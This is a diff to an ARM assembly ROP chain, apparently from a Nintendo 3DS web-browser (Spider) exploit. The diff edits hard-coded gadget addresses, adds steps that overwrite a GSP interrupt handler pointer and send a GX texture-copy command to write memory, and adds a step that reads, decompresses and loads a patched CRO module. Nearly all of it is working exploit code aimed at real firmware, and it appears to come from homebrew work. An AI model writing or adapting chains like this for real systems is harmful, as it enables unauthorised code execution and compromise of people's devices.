@@ -18,6 +18,13 @@ thread0rop:
 	; 	.word 0x00FFFFFF
 	; .word 0x002D6A5C ; svcSleepThread
 
+	; .word 0x00279a28 ; pop {lr, pc}
+	; ropLoop:
+	; 	.word SPIDER_THREAD0ROP_VADR+ropLoop ; lr => sp
+	; .word 0x00279a24 ; mov sp, lr | pop {lr, pc}
+
+	; .word 0xDEADDEAD
+
 	;grab ldr:ro handle
 		.word 0x002954e8 ; pop {r0, pc}
 			.word SPIDER_ROHANDLE_ADR ; r0 (dst)
@@ -147,7 +154,7 @@ thread0rop:
 
 		;flush data cache
 			.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
-				.word 0x003DA72C ; r0 (handle ptr)
+				.word SPIDER_GSPHANDLE_ADR ; r0 (handle ptr)
 				.word 0xFFFF8001 ; r1 (kprocess handle)
 				.word SPIDER_GSPHEAPBUF  ; r2 (address)
 				.word 0x00000200 ; r3 (size)
@@ -157,12 +164,19 @@ thread0rop:
 				.word 0xDEADC0DE ; r5 (garbage)
 				.word 0xDEADC0DE ; r6 (garbage)
 
+		;overwrite gsp event ptr
+			.word 0x002954e8 ; pop {r0, pc}
+				.word 0x00274028 ; r0 (bx lr)
+			.word 0x0026bca4 ; pop {r4, pc}
+				.word 0x003D8C60 ; r4 (handler ptr addr)
+			.word 0x0026bca0 ; str r0, [r4] | pop {r4, pc}
+				.word 0xDEADC0DE ; r4 (garbage)
+
 		;send GX command
 			.word 0x002954e8 ; pop {r0, pc}
-				.word 0x3D8C40+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
+				.word SPIDER_GSPSHAREDMEM_ADR ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
 			.word 0x0023d10c ; pop {r1, pc}
 				.word SPIDER_THREAD0ROP_VADR+gxCommand ; r1 (cmd addr)
-
 			.word 0x002A5C68 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R10,PC})
 				.word 0xDEADC0DE ; r4 (garbage)
 				.word 0xDEADC0DE ; r5 (garbage)
@@ -171,20 +185,6 @@ thread0rop:
 				.word 0xDEADC0DE ; r8 (garbage)
 				.word 0xDEADC0DE ; r9 (garbage)
 				.word 0xDEADC0DE ; r10 (garbage)
-
-
-
-			; .word 0x002814f4 ; ldr r0, [r0] | pop {r4, pc}
-			; 	.word 0xDEADC0DE
-			; .word DEBUGADR
-
-	.word 0x002954e8 ; pop {r0, pc}
-		.word 0xFFFFFFFF
-	.word 0x0023d10c ; pop {r1, pc}
-		.word 0x00FFFFFF
-	.word 0x002D6A5C ; svcSleepThread
-
-
 
 	;read cro
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
@@ -203,10 +203,25 @@ thread0rop:
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
 			.word SPIDER_THREAD0ROP_VADR+fileObj+0x200 ; r0 (this)
 			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
-			.word SPIDER_CROLOCATION ; r2 (dst)
-			.word SPIDER_CROSIZE ; r3 (size)
+			.word SPIDER_CROLEXLOCATION ; r2 (dst)
+			.word SPIDER_CROCMPSIZE ; r3 (size)
 			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x0030A098 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
+			.word 0xDEADC0DE ; r4 (garbage)
+			.word 0xDEADC0DE ; r5 (garbage)
+			.word 0xDEADC0DE ; r6 (garbage)
+			.word 0xDEADC0DE ; r7 (garbage)
+			.word 0xDEADC0DE ; r8 (garbage)
+			.word 0xDEADC0DE ; r9 (garbage)
+
+	;decompress cro
+		.word 0x002954e8 ; pop {r0, pc}
+			.word SPIDER_CROLEXLOCATION ; r0 (src)
+		.word 0x0023d10c ; pop {r1, pc}
+			.word SPIDER_CROLOCATION ; r1 (dst)
+		.word 0x00279a28 ; pop {lr, pc}
+			.word 0x0027a124 ; lr (pop {pc})
+		.word 0x0026AE4C ; lz11Decomp (ends in LDMFD   SP!, {R4-R9})
 			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0xDEADC0DE ; r5 (garbage)
 			.word 0xDEADC0DE ; r6 (garbage)
@@ -321,7 +336,7 @@ thread0rop:
 			.word SPIDER_CROLOCATION ; r2 (cro buffer)
 			.word SPIDER_CROMAPADR ; r3 (cro map addr)
 			.word 0xDEADC0DE ; r4 (garbage)
-		.word 0x0011D610 ; RO_LoadAndFixCRO ; TODO : UPDATE !
+		.word 0x00273124 ; RO_LoadAndFixCRO ; TODO : UPDATE !
 			.word SPIDER_CROSIZE ; arg_0 (SPIDER_CROSIZE) (r4)
 			.word CRO_RELOCATION_OFFSET ; arg_4 (data1addr) (r5)
 			.word 0x00000000 ; arg_8 (r6)
@@ -337,15 +352,6 @@ thread0rop:
 		.word 0xDEADDEAD
 
 ; .orga 0x800
-	.align 0x8
-	romfsHandle:
-		.word 0x00000000
-		.word 0x00000000
-
-	.align 0x4
-	fileHandle:
-		.word 0x00000000
-
 	staticCrr_str:
 		.string "rom:/.crr/static.crr"
 		.byte 0x00
@@ -365,6 +371,7 @@ thread0rop:
 		.word 0x00000000
 
 	.align 0x4
+	.align 0x20
 	gxCommand:
 		.word 0x00000004 ;command header (SetTextureCopy)
 		.word SPIDER_GSPHEAPBUF ;source address
@@ -382,27 +389,27 @@ thread0rop:
 
 	.align 0x4
 	croPatch0:
-	.incbin "../../build/cro/patch0.bin"
+		.incbin "../../build/cro/patch0.bin"
 	croPatch0_end:
 
 	.align 0x4
 	croPatch700:
-	.incbin "../../build/cro/patch1.bin"
+		.incbin "../../build/cro/patch1.bin"
 	croPatch700_end:
 
 	.align 0x4
 	croPatch2000:
-	.incbin "../../build/cro/patch2.bin"
+		.incbin "../../build/cro/patch2.bin"
 	croPatch2000_end:
 
 	.align 0x4
 	croPatch1D9020:
-	.incbin "../../build/cro/patch3.bin"
+		.incbin "../../build/cro/patch3.bin"
 	croPatch1D9020_end:
 
 	.align 0x4
 	croPatch1DBA90:
-	.incbin "../../build/cro/patch4.bin"
+		.incbin "../../build/cro/patch4.bin"
 	croPatch1DBA90_end:
 
 	.align 0x4
